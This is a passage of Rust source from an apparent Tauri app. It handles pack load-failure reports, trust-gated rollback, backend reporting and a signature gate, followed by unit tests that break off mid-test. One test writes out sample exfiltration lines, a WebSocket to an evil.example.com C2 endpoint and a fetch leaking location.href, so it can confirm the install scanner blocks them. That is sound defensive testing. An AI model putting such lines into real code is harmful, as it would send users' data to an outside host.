        let dir = source_bundle::bundle_dir(&app);
        let state = load_state(&dir);
        match report_trust(&state, &pack_id) {
            ReportTrust::Full | ReportTrust::ObserveOnly => {
                clear_pending(&pack_id);
                clear_pack_error_at(&dir, &pack_id);
            }
            ReportTrust::None => {
                log::warn!("[source-bundle] 拒绝 meta 装载上报（{pack_id}：非生效包且无现场）");
                return Ok(json!({ "loaded": false }));
            }
        }
    }
    log::info!(
        "[source-bundle] meta 槽已装载：{} v{}",
        if pack_id.is_empty() {
            "（未装数据包）"
        } else {
            &pack_id
        },
        code.unwrap_or(0)
    );
    Ok(json!({ "loaded": true }))
}

/// 播放包装载/冒烟失败上报（引擎页调用）：
/// - 更新现场（isUpdate）→ 自动回滚 `.prev`（无旧包则整体摘除）并拉黑该版本，
///   广播换包让引擎装载回退包；
/// - 手动安装/boot 发现的失败 → 保留现场等用户处理（设置页显示引擎侧报错）。
/// 两种情况都把失败摘要记到包记录 last_error（广播前写，刷新即可见）。
/// 官方播放包（manifest 通道）额外上报后端（更新失败 = smoke_failed）。
#[tauri::command(rename = "source_pack_load_failed")]
pub async fn cmd_source_pack_load_failed(
    app: AppHandle,
    pack_id: String,
    error: String,
) -> Result<Value, String> {
    let dir = source_bundle::bundle_dir(&app);
    let pending = pending_map()
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .get(&pack_id)
        .cloned();
    let state = load_state(&dir);
    let Some(pack) = state.pack(&pack_id).cloned() else {
        let _ = take_pending(&pack_id);
        return Ok(json!({ "handled": false }));
    };
    // 可信级别：无现场且非生效包的上报一律丢弃（恶意播放包伪造他人失败 →
    // 会误触发回滚/误记 last_error，并向后端灌假 smoke_failed）
    let trust = report_trust(&state, &pack_id);
    if trust == ReportTrust::None {
        log::warn!(
            "[source-bundle] 拒绝播放包装载失败上报（{pack_id}：非生效包且无现场）"
        );
        return Ok(json!({ "handled": false }));
    }
    if pack.id == OFFICIAL_PLAY_ID {
        let result = if pending.as_ref().map(|p| p.is_update) == Some(true) {
            "smoke_failed"
        } else {
            "load_failed"
        };
        report_to_backend(&app, pack.version_code, result.to_string(), error.clone()).await;
    }
    log::warn!(
        "[source-bundle] 播放包装载失败（{} v{}）: {error}",
        pack.id,
        pack.version_code
    );

    // 回滚是破坏性动作：只允许「确有更新现场」的上报触发（见 report_trust 文档）。
    // ObserveOnly（boot 期无现场）只记账，不动磁盘上的 .prev。
    let is_update = trust == ReportTrust::Full
        && pending.as_ref().map(|p| p.is_update) == Some(true);
    if is_update {
        let (reverted, blacklisted) = rollback_update_at(&dir, &pack_id);
        // 回滚后旧记录复活（首装型则已摘除）：把这次失败记在幸存记录上
        note_pack_error_at(&dir, &pack_id, &error);
        broadcast_packs_changed(&app);
        return Ok(json!({ "handled": true, "reverted": reverted, "blacklisted": blacklisted }));
    }
    note_pack_error_at(&dir, &pack_id, &error);
    Ok(json!({ "handled": true, "reverted": false }))
}

/// 数据包（meta 槽）装载失败上报（引擎页调用；引擎页已自行下线数据面：
/// entries 清空，数据接口按「未安装」口径报错）：
/// - 更新现场 → 回滚 `.prev` / 摘除首装 + 拉黑，广播 meta-changed 装回旧版；
/// - 手动启用失败 → 数据槽清空（未装态，首页引导重新出现）。
/// 两种情况都把失败摘要记到包记录 last_error（广播前写，刷新即可见）。
#[tauri::command(rename = "source_meta_load_failed")]
pub async fn cmd_source_meta_load_failed(
    app: AppHandle,
    pack_id: String,
    error: String,
) -> Result<Value, String> {
    let dir = source_bundle::bundle_dir(&app);
    let state = load_state(&dir);
    let trust = report_trust(&state, &pack_id);
    if trust == ReportTrust::None {
        log::warn!("[source-bundle] 拒绝数据包装载失败上报（{pack_id}：非生效包且无现场）");
        return Ok(json!({ "handled": false }));
    }
    let pending = pending_map()
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .get(&pack_id)
        .cloned();
    log::warn!("[source-bundle] 数据包装载失败（{pack_id}）: {error}");
    // 回滚/清槽都是破坏性动作：只有确有更新现场时（Full）才允许，
    // 防恶意播放包对同槽位的其他数据包伪造失败触发误回滚/误清槽。
    let is_update = trust == ReportTrust::Full
        && pending.as_ref().map(|p| p.is_update) == Some(true);
    if is_update {
        let (reverted, blacklisted) = rollback_update_at(&dir, &pack_id);
        // 回滚后旧记录复活（首装型则已摘除）：把这次失败记在幸存记录上
        note_pack_error_at(&dir, &pack_id, &error);
        broadcast_meta_changed(&app);
        return Ok(json!({ "handled": true, "reverted": reverted, "blacklisted": blacklisted }));
    }
    note_pack_error_at(&dir, &pack_id, &error);
    // 手动启用失败 → 清空数据槽。清槽同样是破坏性动作：只有本次上报的包
    // **既生效又有现场**（Full）才允许——否则一个已生效的恶意播放包只要对
    // 当前生效的数据包调一次本命令，就能把健康的数据面打到「未装态」（DoS）。
    // 代价是启动时装载失败不再自动清槽（只记 last_error，引擎页自行下线数据面，
    // 用户可在设置页改选/清空），这是有意的取舍：破坏性动作只认宿主现场。
    if trust == ReportTrust::Full {
        // note_pack_error_at 已把 last_error 落盘：这里必须重新读一次状态，
        // 复用上面的旧快照回写会把刚写进去的失败摘要覆盖掉。
        let mut state = load_state(&dir);
        if state.active_meta_id.as_deref() == Some(&pack_id) {
            state.active_meta_id = None;
            save_state(&dir, &state)?;
            broadcast_meta_changed(&app);
            return Ok(json!({ "handled": true, "reverted": false, "slotCleared": true }));
        }
    }
    Ok(json!({ "handled": true, "reverted": false }))
}

/// 装载结果上报（仅官方播放包通道；引擎页冒烟后调用）
#[tauri::command(rename = "source_report")]
pub async fn cmd_source_report(
    app: AppHandle,
    source_version_code: i64,
    result: String,
    detail: String,
) -> Result<(), String> {
    report_to_backend(&app, source_version_code, result, detail).await;
    Ok(())
}

fn app_version_code() -> i64 {
    astral::version_code()
}

async fn report_to_backend(app: &AppHandle, code: i64, result: String, detail: String) {
    let client = app.state::<crate::AppState>().astral.clone();
    let payload = json!({
        "platform": 1103,
        "appVersionCode": app_version_code(),
        "sourceVersionCode": code,
        "result": result,
        "detail": detail,
    });
    // 免认证上报：失败只记日志
    if let Err(e) = client.post_json_public("app/source/report", payload).await {
        log::warn!("[source-bundle] 装载结果上报失败: {e}");
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn header_line(kind: &str, id: &str, code: i64) -> String {
        format!(
            r#"/*__QT_PACK__{{"kind":"{kind}","id":"{id}","name":"测试包","versionCode":{code},"versionName":"v{code}.0","updateUrl":""}}*/"#
        )
    }

    /// 造一个可安装的最小包文本（首行包头 + 凑够 MIN_PACK_BYTES 的正文）
    fn pack_text(kind: &str, id: &str, code: i64, marker: bool) -> String {
        let mut text = header_line(kind, id, code);
        text.push('\n');
        if kind == PACK_KIND_PLAY && marker {
            text.push_str("globalThis.__qtPlayPackFactory = function () {};\n");
        }
        let pad = "var padding = \"".to_string() + &"x".repeat(64) + "\";\n";
        while text.len() < MIN_PACK_BYTES + 128 {
            text.push_str(&pad);
        }
        text
    }

    fn tmp_dir(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "ll-src-v3-{tag}-{}-{}",
            std::process::id(),
            unix_now()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// 官方 id 签名闸门旁路（仅测试二进制存在，生产编译无此符号）：
    /// 需要安装「无签名官方 id 包」的旧测试用它模拟签名落地前（2026-10 之前）
    /// 的历史安装路径；闸门本身的验证见 official_pack_gate_* 测试。
    pub(super) static BYPASS_SIGNATURE_GATE: std::sync::atomic::AtomicUsize =
        std::sync::atomic::AtomicUsize::new(0);

    /// 签名闸门互斥锁：旁路类（BYPASS_SIGNATURE_GATE 计数 >0 期间）与
    /// 「必须拒绝」断言类测试互斥——cargo test 并发下，二者交错会让
    /// reject 测试恰好撞上别人的旁路窗口而随机失败。
    ///
    /// 兼作**官方保留 id 的安装互斥**：待生效现场（PENDING_APPLIES）是按包 id
    /// 存的进程级全局表，多个测试安装同一个 `play-official` 时，任何一个的
    /// `take_pending("play-official")` 都会抽走别人的现场，让「空槽上位后
    /// 存在待生效现场」这类断言随机失败（2026-10 在 CPU 高负载下复现，
    /// 227/228 间歇失败）。**凡安装 play-official 的测试都必须持有本锁。**
    static GATE_TEST_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    /// RAII 旁路：作用域内放行无签名官方包，离开作用域自动恢复硬校验。
    /// 计数而非布尔：cargo test 多线程并发下，多个旁路测试交错时，
    /// 任何一个 drop 都不能把别人的旁路关掉（布尔版曾致随机失败）。
    /// 同时持有 GATE_TEST_LOCK，与 reject 断言类测试互斥。drop 顺序保证
    /// 「先计数归零、后放锁」（impl Drop::drop 先于字段释放）。
    struct SignatureGateBypass {
        _lock: std::sync::MutexGuard<'static, ()>,
    }

    impl SignatureGateBypass {
        fn new() -> Self {
            let _lock = GATE_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
            BYPASS_SIGNATURE_GATE.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            Self { _lock }
        }
    }

    impl Drop for SignatureGateBypass {
        fn drop(&mut self) {
            BYPASS_SIGNATURE_GATE.fetch_sub(1, std::sync::atomic::Ordering::SeqCst);
        }
    }

    /// 发布私钥预签名的官方向量（qt-sources scripts/sign-pack.mjs 同约定，
    /// node:crypto ed25519 生成；私钥不进仓库，向量只用于验证端到端验签路径：
    /// 生产公钥 → split_sign_block → ring verify 全链路）。
    /// 末尾的签名块在测试里拼上（SIGNED_OFFICIAL_SIG_B64 对本文本全文有效）。
    const SIGNED_OFFICIAL_TEXT: &str = r#"/*__QT_PACK__{"kind":"play","id":"play-official","name":"官方播放包·测试向量","versionCode":2026100201,"versionName":"2026.10.02.1","updateUrl":"https://example.com/play-bundle.js","notes":""}*/
/*__QT_PACK__*/ 后续行是注释占位……
// pad line
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// __qtPlayPackFactory stub for gate test
"#;
    const SIGNED_OFFICIAL_SIG_B64: &str =
        "lPtmJNM2R349y+OMrTbjg0AQq9vNCM01ow8ec/Ud9Xf4rsVQcAa6xirEG4r6VSSpSo4MKHdbeIPnccLJJNbZBA==";

    fn signed_official_pack() -> String {
        format!(
            "{SIGNED_OFFICIAL_TEXT}/*__QT_SIGN__{{\"alg\":\"ed25519\",\"sig\":\"{SIGNED_OFFICIAL_SIG_B64}\"}}*/\n"
        )
    }

    #[test]
    fn official_pack_gate_rejects_unsigned() {
        let _lock = GATE_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let dir = tmp_dir("gate-uns");
        // 无签名块的官方 id 包：直链/本地渠道最常见的冒充形态
        let err = install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, OFFICIAL_PLAY_ID, 1, true),
            false,
            "",
            "",
        )
        .unwrap_err();
        assert!(err.contains("官方包签名校验失败"), "{err}");
        assert!(err.contains("缺少官方签名"), "{err}");
        // 也没有落盘
        assert!(!install_dir(&dir, OFFICIAL_PLAY_ID)
            .join(ARTIFACT_PLAY)
            .is_file());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn official_pack_gate_rejects_forged_signature() {
        let _lock = GATE_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let dir = tmp_dir("gate-fge");
        // 有签名块但对不上内容（把别处签的名搬过来/改过正文）
        let mut text = pack_text(PACK_KIND_PLAY, OFFICIAL_PLAY_ID, 1, true);
        text.push_str(&format!(
            "/*__QT_SIGN__{{\"alg\":\"ed25519\",\"sig\":\"{SIGNED_OFFICIAL_SIG_B64}\"}}*/\n"
        ));
        let err = install_pack_at(&dir, &text, false, "", "").unwrap_err();
        assert!(err.contains("签名不匹配"), "{err}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn official_pack_gate_accepts_release_signed_vector() {
        // 本测试装的是官方保留 id play-official，末尾 take_pending(OFFICIAL_PLAY_ID)
        // 会抽走进程级全局表里的现场；不持锁就会把并发跑着的
        // install_play_pack_activates_when_slot_empty 的断言抽空（见 GATE_TEST_LOCK 注释）。
        let _lock = GATE_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let dir = tmp_dir("gate-ok");
        install_pack_at(
            &dir,
            &signed_official_pack(),
            false,
            INSTALL_SOURCE_URL,
            "https://example.com/play-bundle.js",
        )
        .expect("发布签名的官方向量必须能装");
        take_pending(OFFICIAL_PLAY_ID);
        let st = load_state(&dir);
        let p = st.pack(OFFICIAL_PLAY_ID).unwrap();
        assert!(p.sign_verified, "验签通过的官方包记录 sign_verified");
        assert_eq!(p.version_code, 2026100201);
        assert_eq!(p.install_source, "url");
        // 落盘文本与源一致（含尾部签块，装载引擎按注释忽略）
        let on_disk = std::fs::read_to_string(
            dir.join("install")
                .join(OFFICIAL_PLAY_ID)
                .join(ARTIFACT_PLAY),
        )
        .unwrap();
        assert!(on_disk.ends_with("*/\n"), "落盘保留尾部签名块");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn third_party_pack_needs_no_signature() {
        let dir = tmp_dir("gate-3rd");
        // 第三方包不签名照常安装（闸门只管官方保留 id）
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-custom", 1, true),
            false,
            INSTALL_SOURCE_URL,
            "https://e/x.js",
        )
        .expect("第三方无签名包必须能装");
        take_pending("play-custom");
        let st = load_state(&dir);
        assert!(!st.pack("play-custom").unwrap().sign_verified);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn unsafe_third_party_pack_is_rejected_by_scan() {
        let dir = tmp_dir("safety-3rd");
        // 危险特征混进凑体积的正文里：安装管线（validate_pack_text）直接拒绝
        let mut text = pack_text(PACK_KIND_PLAY, "evil-pack", 1, true);
        text.push_str("const ws = new WebSocket('wss://evil.example.com/c2');\n");
        text.push_str("await fetch('https://evil.example.com/steal?d=' + location.href);\n");
        let err =
            install_pack_at(&dir, &text, false, INSTALL_SOURCE_URL, "https://e/x.js").unwrap_err();
        assert!(err.contains("不安全代码特征"), "{err}");
        assert!(err.contains("WebSocket"), "{err}");
        assert!(err.contains("fetch("), "{err}");
        assert!(
            !install_dir(&dir, "evil-pack").join(ARTIFACT_PLAY).is_file(),
            "危险包不落盘"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn official_pack_scan_hits_do_not_block() {
        let dir = tmp_dir("safety-off");
        let _g = SignatureGateBypass::new();
        // 官方 id（签名上游已验）即使命中扫描规则也放行：良性字样
        // （如请求头里的 'XMLHttpRequest' 字符串）不该挡自家包
        let mut text = pack_text(PACK_KIND_PLAY, OFFICIAL_PLAY_ID, 1, true);
        text.push_str("headers['X-Requested-With'] = 'XMLHttpRequest';\n");
        validate_pack_text(&dir, &text).expect("官方包扫描命中不阻断（签名即背书）");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn state_roundtrip_v3() {
        let dir = tmp_dir("round");
        let mut st = SourceBundleState::new_v3();
        st.packs.push(SourcePackMeta {
            id: "play-official".into(),
            kind: PACK_KIND_PLAY.into(),
            name: "官方播放包".into(),
            version_code: 2026100201,
            version_name: "2026.10.02.1".into(),
            update_url: String::new(),
            dir: "play-official".into(),
            installed_at: 1,
            updated_at: 2,
            skip_codes: vec![2026091701],
            last_probe_at: 3,
            install_source: "url".into(),
            install_ref: "https://example.com/play.js".into(),
            last_error: "装载失败：SyntaxError".into(),
            last_error_at: 1_758_000_000_012,
            sign_verified: true,
        });
        st.active_id = Some("play-official".into());
        st.active_meta_id = None;
        st.last_check_at = 42;
        save_state(&dir, &st).unwrap();
        // 写上主产物，落盘校验才不会把它当幽灵包剔除
        let target = install_dir(&dir, "play-official");
        std::fs::create_dir_all(&target).unwrap();
        std::fs::write(target.join(ARTIFACT_PLAY), "// stub").unwrap();
        let back = load_state(&dir);
        assert_eq!(back.schema, 3);
        assert_eq!(back.packs.len(), 1);
        assert_eq!(back.packs[0].skip_codes, vec![2026091701]);
        assert_eq!(back.packs[0].install_source, "url");
        assert_eq!(back.packs[0].install_ref, "https://example.com/play.js");
        assert_eq!(back.packs[0].last_error, "装载失败：SyntaxError");
        assert_eq!(back.packs[0].last_error_at, 1_758_000_000_012);
        assert_eq!(back.active_id.as_deref(), Some("play-official"));
        assert_eq!(back.last_check_at, 42);
        // 新字段以 camelCase 落盘（与前端 SourcePackVo 同名键）
        let raw = std::fs::read_to_string(state_path(&dir)).unwrap();
        assert!(
            raw.contains("\"installSource\": \"url\""),
            "installSource camelCase: {raw}"
        );
        assert!(
            raw.contains("\"lastErrorAt\": 1758000000012"),
            "lastErrorAt camelCase"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn v2_migrates_to_v3() {
        let dir = tmp_dir("v2m");
        let old_play = dir.join("install").join("2026100101");
        std::fs::create_dir_all(&old_play).unwrap();
        std::fs::write(
            old_play.join(ARTIFACT_PLAY),
            pack_text(PACK_KIND_PLAY, "official", 2026100101, true),
        )
        .unwrap();
        let custom = dir.join("install").join("custom-20261001-120000");
        std::fs::create_dir_all(&custom).unwrap();
        std::fs::write(
            custom.join(ARTIFACT_PLAY),
            pack_text(PACK_KIND_PLAY, "custom-20261001-120000", 0, true),
        )
        .unwrap();
        let v2 = r#"{
            "schema": 2,
            "packs": [
                {"id":"official","name":"play-bundle","version":"chain.11","versionCode":2026100101,
                 "versionName":"2026.10.01.1","source":"official","dir":"2026100101","installedAt":100},
                {"id":"custom-20261001-120000","name":"自定义播放包","version":"","versionCode":0,
                 "versionName":"custom:20261001-120000","source":"custom","dir":"custom-20261001-120000","installedAt":200}
            ],
            "activeId": "official",
            "bad": [2026091701],
            "lastCheckAt": 1758000000,
            "previousOfficial": {"id":"official","versionCode":2026091801}
        }"#;
        std::fs::write(state_path(&dir), v2).unwrap();
        let st = load_state(&dir);
        assert_eq!(st.schema, 3);
        assert_eq!(st.packs.len(), 2);
        let official = st.pack(OFFICIAL_PLAY_ID).unwrap();
        assert_eq!(official.kind, PACK_KIND_PLAY);
        assert_eq!(official.version_code, 2026100101);
        assert_eq!(
            official.skip_codes,
            vec![2026091701],
            "bad[] → play-official skipCodes"
        );
        assert_eq!(official.dir, OFFICIAL_PLAY_ID, "目录改名到 id");
        assert_eq!(
            official.install_source, "manifest",
            "v2 official → manifest 渠道"
        );
        assert_eq!(
            st.pack("custom-20261001-120000").unwrap().install_source,
            "",
            "v2 custom → 来源未知"
        );
        assert!(
            dir.join("install")
                .join(OFFICIAL_PLAY_ID)
                .join(ARTIFACT_PLAY)
                .is_file(),
            "产物随目录改名"
        );
        assert!(!dir.join("install").join("2026100101").exists());
        assert_eq!(
            st.active_id.as_deref(),
            Some(OFFICIAL_PLAY_ID),
            "official → play-official"
        );
        assert_eq!(st.last_check_at, 1758000000);
        // 自定义包保持
        assert!(st.pack("custom-20261001-120000").is_some());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn v1_wipes_install_dirs() {
        let dir = tmp_dir("v1m");
        std::fs::create_dir_all(dir.join("install").join("2026091801")).unwrap();
        std::fs::write(
            dir.join("install")
                .join("2026091801")
                .join("source-bundle.js"),
            b"export const x = 1;",
        )
        .unwrap();
        let v1 = r#"{"installed":{"sourceVersionCode":2026091801},"previous":null,"bad":[2026091701],"lastCheckAt":1758000000}"#;
        std::fs::write(state_path(&dir), v1).unwrap();
        let st = load_state(&dir);
        assert_eq!(st.schema, 3);
        assert!(!dir.join("install").exists(), "v1 目录整体清掉");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn corrupt_state_defaults_to_v3() {
        let dir = tmp_dir("corrupt");
        std::fs::write(state_path(&dir), "not json").unwrap();
        let st = load_state(&dir);
        assert_eq!(st.schema, 3);
        assert!(st.packs.is_empty());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn install_play_pack_activates_when_slot_empty() {
        let dir = tmp_dir("install1");
        // 旁路签名闸门：本测试关注空槽上位语义（闸门验证见 official_pack_gate_*）
        let _gate = SignatureGateBypass::new();
        let outcome = install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-official", 1, true),
            false,
            "",
            "",
        )
        .unwrap();
        assert!(outcome.activated, "空槽自动上位");
        assert!(!outcome.replaced);
        assert!(install_dir(&dir, "play-official")
            .join(ARTIFACT_PLAY)
            .is_file());
        assert!(pending_map().lock().unwrap().contains_key("play-official"));
        // 产物在 → 不被落盘校验剔除
        let st = load_state(&dir);
        assert_eq!(st.packs.len(), 1);
        let _ = take_pending("play-official");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn install_does_not_steal_occupied_slot() {
        let dir = tmp_dir("install2");
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-a", 1, true),
            false,
            "",
            "",
        )
        .unwrap();
        take_pending("play-a");
        let outcome = install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-b", 1, true),
            false,
            "",
            "",
        )
        .unwrap();
        assert!(!outcome.activated, "不抢生效位");
        let st = load_state(&dir);
        assert_eq!(st.active_id.as_deref(), Some("play-a"));
        assert_eq!(st.packs.len(), 2);
        let _ = take_pending("play-b");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// P-IPC-2 授权收紧的核心判据：上报可信级必须「生效 + 有现场」双条件。
    /// 任缺其一都不许触发破坏性动作（回滚 .prev / 清空生效槽）。
    #[test]
    fn report_trust_requires_both_active_and_pending() {
        let dir = tmp_dir("trust");
        // 空槽安装 → 自动上位 + 有现场 ⇒ Full
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "trust-a", 1, true),
            false,
            "",
            "",
        )
        .unwrap();
        let st = load_state(&dir);
        assert_eq!(
            report_trust(&st, "trust-a"),
            ReportTrust::Full,
            "生效 + 有现场"
        );
        // 现场被成功上报收摊后：仍生效但无现场 ⇒ ObserveOnly（只许补名/记 last_error）
        take_pending("trust-a");
        assert_eq!(
            report_trust(&st, "trust-a"),
            ReportTrust::ObserveOnly,
            "生效但无现场不得回滚/清槽"
        );
        // 槽位被占，安装第二个包：不抢生效位，但同样留下现场。
        // 这个「滞留现场」正是只认 pending 时的漏洞来源——必须判 None。
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "trust-b", 1, true),
            false,
            "",
            "",
        )
        .unwrap();
        let st = load_state(&dir);
        assert_eq!(st.active_id.as_deref(), Some("trust-a"));
        assert!(has_pending("trust-b"), "被占槽的安装同样留下现场");
        assert_eq!(
            report_trust(&st, "trust-b"),
            ReportTrust::None,
            "非生效包即便有现场也不可信：滞留现场不可被他人（或自己）消费"
        );
        take_pending("trust-b");
        // 记录不存在的包
        assert_eq!(report_trust(&st, "ghost"), ReportTrust::None);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// 数据槽同理：生效判据按 kind 取对应槽位，跨 kind 不得串台。
    #[test]
    fn report_trust_covers_meta_slot() {
        let dir = tmp_dir("trustm");
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_META, "meta-trust-a", 1, false),
            false,
            "",
            "",
        )
        .unwrap();
        let st = load_state(&dir);
        assert_eq!(st.active_meta_id.as_deref(), Some("meta-trust-a"));
        assert_eq!(report_trust(&st, "meta-trust-a"), ReportTrust::Full);
        take_pending("meta-trust-a");
        assert_eq!(report_trust(&st, "meta-trust-a"), ReportTrust::ObserveOnly);
        // 同 kind 槽位被占：第二个数据包有现场也不可信
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_META, "meta-trust-b", 1, false),
            false,
            "",
            "",
        )
        .unwrap();
        let st = load_state(&dir);
        assert_eq!(st.active_meta_id.as_deref(), Some("meta-trust-a"));
        assert!(has_pending("meta-trust-b"));
        assert_eq!(report_trust(&st, "meta-trust-b"), ReportTrust::None);
        // 数据包不占播放槽：播放包照旧走 activeId 判生效
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-trust-c", 1, true),
            false,
            "",
            "",
        )
        .unwrap();
        let st = load_state(&dir);
        assert_eq!(report_trust(&st, "play-trust-c"), ReportTrust::Full);
        assert_eq!(
            report_trust(&st, "meta-trust-a"),
            ReportTrust::ObserveOnly,
            "播放包生效不影响数据包自身的可信级"
        );
        let _ = take_pending("meta-trust-b");
        let _ = take_pending("play-trust-c");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn same_id_update_backs_up_prev_and_keeps_installed_at() {
        let dir = tmp_dir("install3");
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-x", 5, true),
            false,
            INSTALL_SOURCE_URL,
            "https://example.com/play-x.js",
        )
        .unwrap();
        take_pending("play-x");
        std::thread::sleep(std::time::Duration::from_millis(1100));
        let outcome = install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-x", 9, true),
            true,
            "",
            "",
        )
        .unwrap();
        assert!(outcome.replaced);
        assert!(outcome.activated);
        let target = install_dir(&dir, "play-x");
        assert!(
            target
                .join(format!("{ARTIFACT_PLAY}{PREV_SUFFIX}"))
                .is_file(),
            ".prev 备份存在"
        );
        let st = load_state(&dir);
        let p = st.pack("play-x").unwrap();
        assert_eq!(p.version_code, 9);
        assert!(
            p.updated_at > p.installed_at,
            "installedAt 保留、updatedAt 前进"
        );
        // 回滚：还原旧版本 + 拉黑 v9
        let (reverted, blacklisted) = rollback_update_at(&dir, "play-x");
        assert!(reverted && blacklisted);
        let st = load_state(&dir);
        assert_eq!(st.pack("play-x").unwrap().version_code, 5);
        assert!(st.pack("play-x").unwrap().skip_codes.contains(&9));
        assert!(!target
            .join(format!("{ARTIFACT_PLAY}{PREV_SUFFIX}"))
            .exists());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn play_install_clears_leftover_chain_json() {
        let dir = tmp_dir("install4");
        // 旁路签名闸门：本测试关注 chain.json 残留清理语义
        let _gate = SignatureGateBypass::new();
        let target = install_dir(&dir, "play-official");
        std::fs::create_dir_all(&target).unwrap();
        std::fs::write(target.join("chain.json"), b"{}").unwrap();
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-official", 1, true),
            false,
            "",
            "",
        )
        .unwrap();
        assert!(
            !target.join("chain.json").exists(),
            "播放包安装清掉残留 chain.json"
        );
        let _ = take_pending("play-official");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn id_conflict_across_kinds_rejected() {
        let dir = tmp_dir("install5");
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_META, "shared-id", 1, false),
            false,
            "",
            "",
        )
        .unwrap();
        take_pending("shared-id");
        let err = install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "shared-id", 2, true),
            false,
            "",
            "",
        )
        .unwrap_err();
        assert!(err.contains("包 id 冲突"), "跨 kind 同 id 拒绝: {err}");
        let st = load_state(&dir);
        assert_eq!(st.pack("shared-id").unwrap().kind, PACK_KIND_META);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn invalid_pack_text_rejected() {
        let dir = tmp_dir("install6");
        assert!(
            install_pack_at(&dir, "var x = 1;\n", false, "", "").is_err(),
            "无包头"
        );
        let no_marker = pack_text(PACK_KIND_PLAY, "play-y", 1, false);
        let err = install_pack_at(&dir, &no_marker, false, "", "").unwrap_err();
        assert!(
            err.contains("__qtPlayPackFactory"),
            "播放包缺装配入口: {err}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn uninstall_clears_active_slot_without_succ() {
        let dir = tmp_dir("install7");
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-a", 1, true),
            false,
            "",
            "",
        )
        .unwrap();
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-b", 1, true),
            false,
            "",
            "",
        )
        .unwrap();
        clear_pending("play-a");
        clear_pending("play-b");
        let mut st = load_state(&dir);
        st.active_id = Some("play-a".into());
        save_state(&dir, &st).unwrap();
